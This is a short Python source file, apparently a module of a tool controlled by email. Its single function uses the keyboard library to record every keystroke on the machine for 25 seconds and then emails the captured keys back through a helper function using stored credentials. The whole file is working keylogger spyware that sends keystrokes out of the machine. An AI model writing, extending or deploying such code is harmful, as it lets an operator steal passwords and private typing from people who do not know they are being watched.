import keyboard
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from my_utils import finish_and_send

def reply_pressed_key(original_email, USERNAME, PASSWORD):
    catched = []
    start_time = time.time()
    
    while True:
        cur = keyboard.read_key()
        catched.append(str(cur))
        
        if time.time() - start_time > 25:
            break

    catched = ' '.join(catched)
    catched = 'Key pressed in the last 25 seconds: ' + catched

    rep = MIMEMultipart('mixed')
    rep.attach(MIMEText(catched))
    finish_and_send(rep, original_email, USERNAME, PASSWORD)